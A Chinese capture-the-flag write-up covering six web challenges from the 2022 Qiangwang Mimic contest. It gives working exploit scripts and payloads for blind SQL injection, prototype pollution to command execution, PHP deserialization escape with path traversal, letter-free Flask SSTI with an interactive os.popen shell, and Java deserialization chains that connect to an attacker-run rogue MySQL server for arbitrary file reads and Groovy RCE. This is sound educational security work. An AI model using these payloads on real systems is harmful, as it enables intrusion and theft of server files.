2022强网拟态WP-Web(ALL)
===================

![QQ图片20221107004850](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-0c39972cf53d4f79b6be734b957444586eea3528.jpeg)

这次的强网拟态Web一共6个题目的全部做题记录WP如下，感觉basename的解析特点， `RMIConnector#connect`函数进行二次反序列化，jdbc连接Mysql恶意服务任意文件读取，已赋值的键值对污染这几个点都挺有意思的，详细的知识点利用看下面WP，每个题都已经记录的很详细了。

popsql
------

开局一个登录界面, 测试确认用户名为admin的时候才会执行sql注入的语句, 所以username固定为admin, 在passowrd参数构造sqlkl注入语句进行`时间盲注`

fuzz后发现`union join ;`都被ban了

```python
import string
import time

import requests

# for i in range(10):
#     # 0稳定子啊4.7~5.4
#     # 1稳定在1~2之间
#     # 2稳定在0.1~0.5
#     sql=f"select case 0 when 0 then benchmark(511111111,1) when 1 then benchmark(311111111,1) else 2 end"
#     password = f"xxx'or({sql.replace(' ', '/**/')})or'"
#     data = {"username": "admin","password": password}
#     print(data["password"])
#     res = requests.post(url, data=data)
#     print(res.elapsed.total_seconds())
# print("========")
# exit()

def get_str(s):
    end="0x"
    for c in s:
        end+=str(hex(ord(c)))[2::]
    return end

def getDatabase():  # 获取数据库名
    global host
    ans = ''
    for i in range(1, 1000):
        low = 32
        high = 128
        mid = (low + high) // 2
        while low < high:
            test_str=get_str(ans+chr(mid))
            print(ans+chr(mid),(low,mid,high))
            # usErs,FL49IsH3rE  CtFGAME
            # 5.7.39
            # sys.schema_table_statistics
            # query="select group_concat(table_schema) from sys.schema_table_statistics"
            # query = "select group_concat(table_schema) from sys.x$ps_schema_table_statistics_io"
            query = "select group_concat(f1aG123) from Fl49ish3re"
            sql = f"select case STRCMP(({query}),{test_str}) when 0 then 0 when 1 then 1 else benchmark(511111111,1) end"
            password = f"xxx'or({sql.replace(' ','/**/')})or'"
            # print(password)
            data = {"username": "admin", "password": password}
            res = requests.post(url, data=data)
            if "Password error" not in res.text:
                print("CHECK!!!!!!\n",res.text)
            if res.elapsed.total_seconds() > 2:
                high = mid
            else:
                low = mid + 1
            mid = (low + high) // 2
        if mid <= 32 or mid >= 127:
            break
        ans += chr(mid - 1)
        print("database is -> " + ans)

url="http://172.51.60.14/index.php"
getDatabase()

```

显示查询`users`表的`password`字段拿到返回提示结果不在users表中, 然后拿到另一个表名`FL49IsH3rE`进行注入获得flag

这个有点奇怪，在没有确认的字段的时候`FL49IsH3rE`执行select语句查找像是不存在一样，即使是`select count(*) from FL49IsH3rE`也是毫无反应

在sys的一个表下有flag查询历史记录, 从里面拿到查询语句从而得到字段名

![image-20221105214823070](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-05cad0796f21cdc65ba75f3bf873a66f6416bb7b.png)

WHOYOUARE
---------

> 这题直接贴一下[@学弟jlan](https://jlan.darkflow.top/)写的WP, 主要核心就是`constructor.prototype`只能污染不存在的参数(但是本地测试\_\_proto\_\_就可以通过两层嵌套成功污染已存在的参数)而command数组在merge污染之前就有赋值定义的所以不能直接通过`constructor.prototype`进行污染
> 
> 但是我们可以嵌套两层`constructor.prototype`对Array数组进行污染, 从而达到污染session.command修改执行命令的目的, 而Array数组的键值`0`指向第一个参数-c, 第二个键值`1`指向的就是执行的命令了, 所以下面的payload就直接污染Array的`1`这个键值对

申源码后条件

- 传入内容为json{"user":"json格式化后字符串"}
- checkcommand中对command类型限制为array，并且限制最多传入两个，而且里面每一项的类型必须为字符串，长度小于等于4，以字母或数字或-开头
- 如果以上验证都通过，那么进入merge文件定义的merge函数，将我们传入的`request.body.user`经过json解析把对象存入user里，然后merge把user传入到`request.user`中
- 而如果对command内容的校验没有通过，那么command就会被直接赋值为`["-c", "id"]`
- merge函数会对内容进行判断，会先对内容进行判断
    
    ```jsx
    const whileTypes = ['boolean', 'string', 'number', 'bigint', 'symbol', 'undefined'];
    //首先判断源和目标内容是否在whileTypes里面，只要有一个在，那么就不会执行merge操作
    const merge = (target, source) => {
      for (const key in source) {
    //        console.log("key:",key);
    //        console.log("源定义：",(typeof source[key]))
    //        console.log("目标定义：",(typeof target[key]))
          if(!whileTypes.includes(typeof source[key]) && !whileTypes.includes(typeof target[key])){
              if(key !== '__proto__'){
                  console.log("keykkkkkk:",key);
                  merge(target[key], source[key]);
              }
          }else{
              target[key] = source[key];
          }
      }
    }
    ```
    
    只要目标和源中有一个类型在其中，就会直接将key之间执行赋值相等，而如果两者都不在，并且这个key不是`__proto__`就会再执行merge操作

梳理完以上条件后，尝试通过`constructor.prototype`来绕过，成功污染

```python
import requests
url="http://127.0.0.1:3000/user"
user='''{"constructor":{"prototype":{"constructor":{"prototype":{"1":"whoami"}}}},"username":{"OK":"a"},"command":["-c"]}'''
# {"constructor":{"prototype":{"constructor":{"prototype":{"command":["-c","lsssss"]}}}}}
# user='''{"username":"aaa"}'''
print({"user":user})
print(requests.post(url=url, json={"user": user}).text)
```

![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-d1dd21377dabc43423a66ac97467bccc5e2e4872.png)  
两层污染到Array，此时我们传入command只传入一项，在merge时遍历source中command属性到1时就会将我们污染的内容传入target的command  
![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-e3f6de9b519a4eae744b5840eac4bfd2f14e1ef6.png)  
![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-f40161ada4a7a62a4f66a8a40d4ded7438295d8c.png)  
在1位置任意传入命令即可执行

```python
import requests
url="http://127.0.0.1:3000/user"
user='''{"constructor":{"prototype":{"constructor":{"prototype":{"1":"cat /flag"}}}},"username":{"OK":"a"},"command":["-c"]}'''
# {"constructor":{"prototype":{"constructor":{"prototype":{"command":["-c","lsssss"]}}}}}
# user='''{"username":"aaa"}'''
print({"user":user})
print(requests.post(url=url, json={"user": user}).text)
```

ezus
----

这个题目应该说有三层

知识点:

1. `basename`如果检测到当前的文件名全部字符都在`非ASCII码范围`就会丢弃当前文件名, 接续将上一层目录作为文件名读出
    
    还有一点就是`/index.php/xxxxxxx`(包括`index.php/x/x/x/x/x/xxx`)都会执行index.php脚本
    
    `$_SERVER["PHP_SELF"]`即为当前URI的执行文件定位路径
    
    ![image-20221106212518357](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-9811671ec4b3e26b8e53b2f9f64e90bba100a762.png)
2. PHP反序列化字符逃逸+PHP反序列化`fastdestruct`绕过\_\_wakeup
3. 对协议解析格式的理解和利用

开局拿到`index.php`源码

![image-20221105204738804](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-59a98d5097b275d6d349a99a6ec1c814e6a32602.png)

```php
<?php
include 'tm.php'; // Next step in tm.php
if (preg_match('/tm\.php\/*$/i', $_SERVER['PHP_SELF']))
{
    exit("no way!");
}
if (isset($_GET['source']))
{
    $path = basename($_SERVER['PHP_SELF']);
    if (!preg_match('/tm.php$/', $path) && !preg_match('/index.php$/', $path))
    {
        exit("nonono!");
    }
    highlight_file($path);
    exit();
}
?> 
<a href="index.php?source">source</a>
```

然后使用上面说的`basename`函数处理特点绕过过滤拿到`tm.php`源码

```http
http://172.51.60.211/index.php/tm.php/%ff?source
```

![image-20221105204641326](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-474abb0b928729016f25797512afa4532817d9e2.png)

```php
 <?php
class UserAccount
{
    protected $username;
    protected $password;

    public function __construct($username, $password)
    {
        $this->username = $username;
        $this->password = $password;
    }
}

function object_sleep($str)
{
    $ob = str_replace(chr(0).'*'.chr(0), '@0@0@0@', $str);
    return $ob;
}

function object_weakup($ob)
{
    $r = str_replace('@0@0@0@', chr(0).'*'.chr(0), $ob);
    return $r;
}

class order
{
    public $f;
    public $hint;

    public function __construct($hint, $f)
    {
        $this->f = $f;
        $this->hint = $hint;
    }

    public function __wakeup()
    {
        //something in hint.php
        if ($this->hint != "pass" || $this->f != "pass") {
            $this->hint = "pass";
            $this->f = "pass";
        }
    }

    public function __destruct()
    {
        if (filter_var($this->hint, FILTER_VALIDATE_URL))
        {
            $r = parse_url($this->hint);
            if (!empty($this->f)) {
                if (strpos($this->f, "try") !==  false && strpos($this->f, "pass") !== false) {
                    @include($this->f . '.php');
                } else {
                    die("try again!");
                }
                if (preg_match('/prankhub$/', $r['host'])) {
                    @$out = file_get_contents($this->hint);
                    echo "<br/>".$out;
                } else {
                    die("<br/>error");
                }
            } else {
                die("try it!");
            }
        }
        else
        {
            echo "Invalid URL";
        }
    }
}

$username = $_POST['username'];
$password = $_POST['password'];

$user = serialize(new UserAccount($username, $password));
unserialize(object_weakup(object_sleep($user)))
?>

```

**简单分析**

1. 不能用户自定义反序列化, 但是会替换序列化后数据中的一些字段, 重点在于他们替换前后的字段长度是不一样的, 所以这就为自定义反序列化提供了机会
2. 通过逐个字符计算得到应该产生28位的偏移, 而`@0@0@0@`每被替换一次就会产生4字符的偏移(就是`username`的字符读取扩张, 从而读取到原本不属于它的字符), 所以使用7次`@0@0@0@`满足28字符的偏移要求, 让后面的`password`逃逸出来执行自定义的反序列化
3. 满足偏移要求后构造加入自定义的反序列化数据, 也就是对`order`类进行反序列化
4. 反序列化会触发`order::__wakeup`重定义`order::f`和`order::hint`
5. `order::__destruct`函数有两个功能, 第一个是`@include($this->f . '.php');`, 第二个是`echo file_get_contents($this->hint);`(执行include之后才会执行file\_get\_contents), 同时对这两个变量有要求: 
    1. `$this->f`必须同时包含`try`和`pass`两个字符串
    2. `$this->hint`使用`parse_url`解析后其域名必须以`prankhub`结尾(也就是`xxx://yyy/zzz`...中的yyy必须以prankhub结尾)

**问题解决**

1. 字符逃逸自定义反序列化
    
    第一点自定义数据触发`order`类的反序列化构造原理上面已经说了, 不再描述
2. `order::__wakeup`绕过
    
    第一眼看到`__wakeup`绕过就下意识的看了一下响应头有没有PHP版本, 然后可以看到是5.x, 所以就是直接使用老方法`把参数个数+1`即可绕过
3. `include`和`file_get_contents`的利用
    
    这个当时还带有一点迷惑性,毕竟自从[hxp CTF 2021 - The End Of LFI?](https://blog.zeddyu.info/2022/01/08/2022-01-08-TheEndOfLFI/)出来以后没有前缀限制且能获取到一个有数据的文件的`include`几乎就等于RCE了
    
    而这个题目环境中是先执行`include`再调用`file_get_contents`, 一开始我便以为是多此一举了, 但是实际执行的时候就出现了问题, 不管是使用陆队文章中的脚本还是使用wupco师傅的[PHP\_INCLUDE\_TO\_SHELL\_CHAR\_DICT](https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT),最后读出的数据都不能RCE(应该就是出题人专门选了一个确实必要字符集的docker容器或者出题人将关键字符集删掉了?不懂..)
    
    > 补充：include预期中应该是使用`php://filter`来读取hint.php的，但是因为include的文件会被加上.php所以并不能读取到flag的.txt文件，后面依旧是使用下面的方法通过`file_get_contents`获取flag
    
    既然`include`没用那就直接让`$this->f='trypass'`满足要求然后执行`file_get_contents`,
    
    首先需要使用协议的格式才能读取, 这里如果想使用`php://filter`就不行, 这里想要可以直接使用一个非协议的随机字符串就行, 这时候满足了`parse_url`和`filter_var($this->hint, FILTER_VALIDATE_URL)`的格式同时又因为没有对应协议所以会被作为文件名解析, 只要多几个`../`即可完成绕过, 最后读取`h0cksr://prankhub/../../../../../../../var/www/html/hint.php`拿到flag位置, 再读取`h0cksr://prankhub/../../../../../../../f1111444449999.txt`拿到flag

因为我这里一开始是准备使用LIF所以`$o->f`的文件名高达上千个字符, 所以让`password`膨胀到了4位数, 需要的拓展位为28位, , 通过执行下面代码

```php
<?php
class order
{
    public $f;
    public $hint;
}
class UserAccount
{
    protected $username;
    protected $password;

}
$o= new order();
$o->f='http://h0cksr.xyz/trypass';
$o->hint='h0cksr://prankhub/../../../../../../../f1111444449999.txt';
$ser=serialize($o);

$insert=';s:6:"h0cksr";'.str_replace('"order":2','"order":3',$ser).';}';
$username = '123'.str_repeat('@0@0@0@',7);
$password = $insert.str_repeat("01234567890",200);

$user = serialize(new UserAccount($username, $password));
file_put_contents("1.txt",$username."\n".$password);
system("python 1.py");
```

因为生成的数据太长复制粘贴比较麻烦所以将请求数据写入一个文件中, 然后在1.py读取文件数据发出请求

```python
import requests

data = open("1.txt","rb").readlines()
username,password = data[0],data[1]
data={
    "username":username,
    "password":password
}
# print(requests.get("http://172.51.60.211").text)
print(username)
print(password)
url="http://172.51.60.211/tm.php"
print("================")
res = requests.post(url,data)
print(res.text)
print("================")

```

读取hint.php拿到flag位置

![image-20221106183042367](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-07b8a5ec30285ae5cdb5e823875ef8b79a252a8d.png)

读取flag

![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-8e2398fb613c43a91d1ade488c3c977037eb1620.png)

没人比我更懂py
--------

Python且输出返回用户数据, 第一考虑SSTI, 试了一下下`{{7*7}}`返回49, 确定是SSTI, 然后进一步确定是不能有字母, 所以就是`无字母SSTI`

直接使用[Flask ssti](http://diego.team/2020/05/20/Flask-SSTI/)中的脚本使用8进制绕过,构造exp即可, 通过`__subclasses__`看到`Popen`, 然后使用for循环逐个遍历找出popen执行命令输出结果获得flag

```python
import requests

def get(exp):
    dicc = []
    exploit = ""
    for i in range(256):
        eval("dicc.append('{}')".format("\\" + str(i)))
    for i in exp:
        exploit += "\\" + str(dicc.index(i))
    return  exploit

# for i in range(10000):
#     payload = "{{" + f"''['{get('__class__')}']['{get('__mro__')}']['{get('__getitem__')}'](1)['{get('__subclasses__')}']()['{get('pop')}']({i})['{get('__init__')}']['{get('__globals__')}']" \
#                      f"['{get('__builtins__')}']['{get('__import__')}']('{get('os')}')['{get('popen')}']" + "}}"
#     print(payload)
#     url = "http://172.51.60.171/"
#     data = {"data": payload}
#
#     res = requests.post(url, data=data)
#     if "popen" in res.text:
#         print(payload)
#         print(res.text)

# {{lipsum.__globals__.__builtins__['__import__']('os').popen('ls').read()}}分割的一部分
# ''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('').read()
while 1:
    cmd = input("CMD#")
    payload = "{{" + f"''['{get('__class__')}']['{get('__mro__')}']['{get('__getitem__')}'](1)['{get('__subclasses__')}']()['{get('pop')}'](81)['{get('__init__')}']['{get('__globals__')}']" \
                     f"['{get('__builtins__')}']['{get('__import__')}']('{get('os')}')['{get('popen')}']('{get(cmd)}')['{get('read')}']()" + "}}"
    # print(payload)
    url = "http://172.51.60.171/"
    data = {"data": payload}
    res = requests.post(url, data=data)
    print(res.text.split("        <p>")[-1].split("</p>")[0])
```

```http
{{''['\137\137\143\154\141\163\163\137\137']['\137\137\155\162\157\137\137']['\137\137\147\145\164\151\164\145\155\137\137'](1)['\137\137\163\165\142\143\154\141\163\163\145\163\137\137']()['\160\157\160'](81)['\137\137\151\156\151\164\137\137']['\137\137\147\154\157\142\141\154\163\137\137']['\137\137\142\165\151\154\164\151\156\163\137\137']['\137\137\151\155\160\157\162\164\137\137']('\157\163')['\160\157\160\145\156']('\154\163')['\162\145\141\144']()}}
```

![image-20221106183839426](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-ee1f1c62fb03d0e2ee7b50b2eb785de63c6de543.png)

NoRCE
-----

查看依赖看到只有除了Spring之外只有一个`5.0.3的mysql-connector-java`, 所以应该就不是直接打纯原生链了, 再看`com.example.demo.utils.MyObjectInputStream`中对反序列化类的过滤, 禁止了下面的类序列化:

1. com.example.demo.bean.Connect (题目给的)
2. java.security.\* (二次反序列化触发)
3. java.rmi.\* (远程加载)

![image-20221107003753712](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-02d0486ca227bb8fc4d6716f7ee028b96717957f.png)

文件结构如下:

![image-20221106214224755](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-f31b9e7f97e55f4e68ecf84115732645e0a693f0.png)

```java
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package com.example.demo;

import com.example.demo.utils.MyObjectInputStream;
import com.example.demo.utils.tools;
import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.io.ObjectInputStream;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;

@Controller
public class IndexController {
    public IndexController() {
    }

    @ResponseBody
    @RequestMapping({"/"})
    public String index() {
        return "wuwuwuwuwuwuwuwu~~~~~~~~~~~~";
    }

    @ResponseBody
    @RequestMapping({"/read"})
    public String readObject(@RequestParam(name = "data",required = true) String data) throws Exception {
        System.out.println(data);
        byte[] bytes = tools.base64Decode(data);
        InputStream inputStream = new ByteArrayInputStream(bytes);
        ObjectInputStream objectInputStream = new MyObjectInputStream(inputStream);
        String secret = data.substring(0, 6);
        String key = objectInputStream.readUTF();
        System.out.println(secret);
        System.out.println(key);
        if (key.hashCode() == secret.hashCode() && !secret.equals(key)) {
            objectInputStream.readObject();
            return "oops";
        } else {
            return "incorrect key";
        }
    }
}

```

控制器会读取data参数进行base64解码然后使用`readUTF`从对象输入流中读取字符, 并且检测查看它的hashcode是否和data的前6个字符串的hashcode相等而字符串本身不相等(hashcode碰撞,这里直接使用`qn0ABX`即可, data数据为序列化数据的base64编码, 在没有添加脏数据默认情况前6个字符就是`rO0ABX` )。

```java
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package com.example.demo.utils;

import java.io.IOException;
import java.io.InputStream;
import java.io.InvalidClassException;
import java.io.ObjectInputStream;
import java.io.ObjectStreamClass;
import java.util.HashSet;
import java.util.Set;

public class MyObjectInputStream extends ObjectInputStream {
    public Set blacklist = new HashSet() {
        {
            this.add("com.example.demo.bean.Connect");
        }
    };

    public MyObjectInputStream(InputStream inputStream) throws IOException {
        super(inputStream);
    }

    protected Class<?> resolveClass(ObjectStreamClass cls) throws IOException, ClassNotFoundException {
        if (!this.blacklist.contains(cls.getName()) && !cls.getName().matches("java\\.security.*") && !cls.getName().matches("java\\.rmi.*")) {
            return super.resolveClass(cls);
        } else {
            throw new InvalidClassException("Unexpected serialized class", cls.getName());
        }
    }
}
```

怎样成功反序列化的问题解决了, 那么接下来就找怎么反序列化了。正常直接反序列化的话会受到上面所说的三个类的限制, 首先我们看一下依赖, 除了Spring自带的之外只有一个`5.0.3的mysql-connector-java`, 相关的就是jdbc连接加载了, 那么怎么触发漏洞其实在`MyBean`这个类里面就有间接的提示了, 里面的`toString`就是反序列化常见的触发点了, 而在`com.example.demo.bean.MyBean#toString`里面掉用了`com.example.demo.bean.MyBean#getConnect`,它会调用一个`JMXConnector`的connetct函数。

```java
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package com.example.demo.bean;

import java.io.IOException;
import java.io.Serializable;
import javax.management.remote.JMXConnector;

public class MyBean implements Serializable {
    private Object url;
    private Object message;
    private JMXConnector conn;

    public MyBean() {
    }

    public MyBean(Object url, Object message) {
        this.url = url;
        this.message = message;
    }

    public MyBean(Object url, Object message, JMXConnector conn) {
        this.url = url;
        this.message = message;
        this.conn = conn;
    }

    public String getConnect() throws IOException {
        try {
            this.conn.connect();
            return "success";
        } catch (IOException var2) {
            return "fail";
        }
    }

    public void connect() {
    }

    public String toString() {
        try {
            return "MyBean{url=" + this.url + ", message=" + this.message + this.getConnect() + '}';
        } catch (IOException var2) {
            var2.printStackTrace();
            return "MyBean{url=" + this.url + ", message=" + this.message + ",state=fail" + '}';
        }
    }

    public Object getMessage() {
        return this.message;
    }

    public void setMessage(Object message) {
        this.message = message;
    }

    public Object getUrl() {
        return this.url;
    }

    public void setUrl(Object url) {
        this.url = url;
    }
}

```

上面说了`com.example.demo.bean.MyBean#toString`会触发`JMXConnector#connect`, 而题目自定义的类`com.example.demo.bean.Connect`就是`JMXConnector`的实现类, 里面也有`connect`函数, 这个函数会使用`com.mysql.jdbc.Driver`加载类内的url, 这里就是重点了, 这个加载我们将其设为`jdbc:mysql://VPS:port/databaseName`, 这时候就可以通过连接我们的恶意Mysql服务进行任意文件读取了

```java
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package com.example.demo.bean;

import java.io.IOException;
import java.io.Serializable;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.util.Map;
import javax.management.ListenerNotFoundException;
import javax.management.MBeanServerConnection;
import javax.management.NotificationFilter;
import javax.management.NotificationListener;
import javax.management.remote.JMXConnector;
import javax.security.auth.Subject;

public class Connect implements JMXConnector, Serializable {
    private String url;
    private String name;
    private String password;

    public Connect(String url, String name, String password) {
        this.url = url;
        this.name = name;
        this.password = password;
    }

    public String getUrl() {
        return this.url;
    }

    public void setUrl(String url) {
        this.url = url;
    }

    public String getName() {
        return this.name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public String getPassword() {
        return this.password;
    }

    public void setPassword(String password) {
        this.password = password;
    }

    public void connect() throws IOException {
        String driver = "com.mysql.jdbc.Driver";

        try {
            Class.forName(driver);
        } catch (ClassNotFoundException var4) {
            var4.printStackTrace();
        }

        try {
            DriverManager.getConnection(this.url + this.name + this.password);
        } catch (SQLException var3) {
            var3.printStackTrace();
        }

    }

    public void connect(Map<String, ?> env) throws IOException {
    }
    public MBeanServerConnection getMBeanServerConnection() throws IOException {
        return null;
    }
    public MBeanServerConnection getMBeanServerConnection(Subject delegationSubject) throws IOException {
        return null;
    }

    public void close() throws IOException {
    }

    public void addConnectionNotificationListener(NotificationListener listener, NotificationFilter filter, Object handback) {
    }

    public void removeConnectionNotificationListener(NotificationListener listener) throws ListenerNotFoundException {
    }

    public void removeConnectionNotificationListener(NotificationListener l, NotificationFilter f, Object handback) throws ListenerNotFoundException {
    }

    public String getConnectionId() throws IOException {
        return null;
    }
}

```

但是前面我们说过`com.example.demo.bean.Connect`这个类是不被允许反序列化的, 那么怎么才能调用呢?

答案就是二次反序列化了, 但是常用的`java.security`也被ban了, 这时候就需要找到另一个触发二次反序列化的class了, 这里可以参考[2022鹏城杯-Ez\_Java](https://blog.csdn.net/miuzzx/article/details/125576866#Ez_Javaxenny_227)和[\[JavaDerserializeLabs-writeup\](http://novic4.cn/)](http://novic4.cn/index.php/archives/26.html#cl-4), 使用`RMIConnector`(JMXConnector的唯一原生实现类)触发二次反序列化, 想要触发RMIConnector的二次反序列化功能就需要调用它的`connect`函数

所以, 这不就符合条件了?

1. 需要二次反序列化绕过`com.example.demo.bean.Connect`的反序列化限制
2. 可以通过`RMIConnector#connect`完成二次反序列化
3. 题目中的`MyBean#toString`会触发一个JMXConnector属性的`connect`函数, RMIConnector是JMXConnector的实现类所以`RMIConnector#connect`也在可触发范围内

好的, 现在问题就来到了怎么触发`MyBean#toString`, 这个就可以用`BadAttributeValueExpException`触发一个对象的`toSring`(CC5中被使用)

所以总结下来就是:

1. 使用`BadAttributeValueExpException => MyBean#toString => RMIConnector#connect => 二次反序列化`
2. 二次反序列化的调用链:`BadAttributeValueExpException => MyBean#toString => com.example.demo.bean.Connect#connect => com.mysql.jdbc.Driver#getConnection => 使用我们定义的jdbc链接去访问恶意Mysql服务 => 任意文件读取`

恶意Mysql服务有很多个, 但是个人还是感觉[rogue\_mysql\_server](https://github.com/rmb122/rogue_mysql_server)这个项目比较好用

先在本地运行`rogue_mysql_server`开启一个恶意的mysql服务, 然后通过二次反序列化让`com.mysql.jdbc.Driver#getConnection`连接`jdbc:mysql://VPS:PORT/file:///?allowLoadLocalInfile=true&allowUrlInLocalInfile=true`, 运行成功可以在rogue\_mysql\_server服务运行界面看到连接请求以及文件读取情况, 如果成功了的话默认会将文件的读取结果输出到`./loot/连接服务的ip/时间戳_文件名`里面

下面是生成触发payload的EXP::

```java
package com.example.demo;

import com.example.demo.bean.Connect;
import com.example.demo.bean.MyBean;
import com.example.demo.utils.MyObjectInputStream;
import com.example.demo.utils.tools;

import javax.management.BadAttributeValueExpException;
import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnector;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class POC {
    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        Field valfield = obj.getClass().getDeclaredField(fieldName);
        valfield.setAccessible(true);
        valfield.set(obj,value);
    }
    public static byte[] serialize(final Object obj) throws IOException {
        final ByteArrayOutputStream out = new ByteArrayOutputStream();
        final ObjectOutputStream objOut = new ObjectOutputStream(out);
        // 序列化后的数据初始6位一般为 rO0ABX 所以writeUTF写入一个和rO0ABX同hashcode的字符串
        objOut.writeUTF("qn0ABX");
        objOut.writeObject(obj);
        return out.toByteArray();
    }
    public static Object deserialize(final byte[] serialized) throws IOException, ClassNotFoundException {
        final ByteArrayInputStream in = new ByteArrayInputStream(serialized);
        final ObjectInputStream objIn = new ObjectInputStream(in);
        return objIn.readObject();
    }
    //首次反序列化, 使用RMIConnector#connect触发二次反序列化
    public static byte[] getTest(String message,RMIConnector rmiConnector) throws Exception {
        String url ="h0cksr::url";
        //String message = "h0cksr::message";
        MyBean myBean = new MyBean(url,message,rmiConnector);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        setFieldValue(badAttributeValueExpException, "val",myBean);
        byte[] ser = serialize(badAttributeValueExpException);
        //deserialize(ser);//执行反序列化检验能否成功触发
        return ser;
    }
    public static void main(String[] args) throws Exception {
        ByteArrayOutputStream tser = new ByteArrayOutputStream();
        ObjectOutputStream toser = new ObjectOutputStream(tser);
        toser.writeObject(getObject());
        toser.close();
//        获取到二次反序列化的base64数据, 后面会通过JMXServiceURL加载触发反序列化
        String exp= Base64.getEncoder().encodeToString(tser.toByteArray());
//        System.out.println("exp::"+exp);
        Map<String, Integer> map=new HashMap<>();
        RMIConnector rmiConnector=new RMIConnector(new JMXServiceURL("service:jmx:rmi://localhost:12345/stub/"+exp),map);
        int i=0;
        byte[] ser = getTest("message"+Integer.toString(i),rmiConnector);
        String data = Base64.getEncoder().encodeToString(ser);
        System.out.println( data);
//        下面代码用于检验数据是否满足题目的hashcode检验要求(可删掉)
        if(true){
            InputStream inputStream = new ByteArrayInputStream(ser);
            ObjectInputStream objectInputStream = new MyObjectInputStream(inputStream);
            String key = objectInputStream.readUTF();
            if(key.hashCode()==data.substring(0, 6).hashCode()){
                System.out.println("OK");
            }
            else System.out.println("Check Your readUTF data's hashCode");
        }
    }
    //被嵌套的二次反序列化对象
    public static Object getObject() throws Exception {
        // 这里修改为Mysql恶意服务Rogue-MySql-Server的ip和port
        String url ="jdbc:mysql://10.91.60.14:3306/file:///?allowLoadLocalInfile=true&allowUrlInLocalInfile=true";
        String name = "&user=root";
        String password = "&password=password";
        Connect connect = new Connect(url,name,password);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);

        String message = "h0cksr::message";
        MyBean myBean = new MyBean(url,message,connect);
        setFieldValue(badAttributeValueExpException, "val",myBean);
        return badAttributeValueExpException;
    }
}
```

使用`https://github.com/allyshka/Rogue-MySql-Server`读取文件, 但是falg并不在`/flag`里面

![image-20221106134934426](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-e610e8f218dcdf3dd864d427a56caa0a531aed5d.png)

先是读取/etc/passwd成功, 但是读取/flag失败了

![image-20221106135242976](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-8a02c0ee0e23d40c31e7de7d404edd1025abd4cc.png)

通过读取`file:///`或`netdoc:///`列根目录拿到flag位置

![image-20221106135402797](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-c41ed39b984d23d57621d67f3a35980e3afecc8d.png)

读取flag

![image-20221106135509562](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-cdf3047c1dd053d8553599353631d0619bd8dfb3.png)

easy\_java
----------

这个题没有源码, 直接访问就是提示输入一个url参数, 值为jdbc链接

如果做了上面的NoRCE那就很简单了, 继续使用上面的方式进行任意文件读取拿到jar包进行分析(读取`file:///`列目录得到程序jar包位置`/application/application.jar`)

```http
url=jdbc:mysql://vps:port/ttt?allowLoadLocalInfile=true&allowUrlInLocalInfile=true
```

然后对源码进行分析, 直接看依赖就测试确认打`Grovy1`这个链子本地测试可用

然后源码分析发现是对url进行了`autoDeserialize`参数的检验, 要求jdbc请求链接不能定义autoDeserialize参数, 这里使用url编码方式绕过, 因为`com.mysql.jdbc.Driver#getConnection`连接jdbc链接的时候会对其进行url解码

绕过了autoDeserialize, 确认了利用链, 然后就是直接设置[rogue\_mysql\_server](https://github.com/rmb122/rogue_mysql_server)的`config.yaml`配置Grovy1的利用链即可

```http
jdbc:mysql://127.0.0.1:3306/test?connectionAttributes=t:grovy1&%61%75%74%6f%44%65%73%65%72%69%61%6c%69%7a%65=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=root&password=password
```

![image-20221107000817821](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-90d2aec9315fe74431be0af853e05e25e5eca7af.png)执行测试语句成功:

![image-20221107000915001](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-a9e0d038eb2324749a6e7e13d13c74f3dbcfebf7.png)

那么来到服务程序中打一下(NONONO的输出是我修改代码才显示的,代码改动看下面):

![image-20221107002355402](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-f4771887bcc2bd4bd95783ae20c41af105ff95e1.png)

可以看到并没有成功, 为什么?

这一波属实小丑了, 因为当时没注意加空格的问题, 所以一直都是有时候可以有时候不行(因为有时候我带了空格有时候没带), 直到比赛结束之后注意到这点

![image-20221107004504487](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-23b76a2a2a5d2657d49494b161d77ed1b2c1f00f.png)

我们在`%61%75%74%6f%44%65%73%65%72%69%61%6c%69%7a%65`的后面加个空格就可以执行成功

![image-20221107002748090](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-0bdcf88a091ff33ad31fa0ea7c25ff63085f191f.png)

这时候就成功了, 原因的话就要看回源代码检查`autoDeserialize`的逻辑了

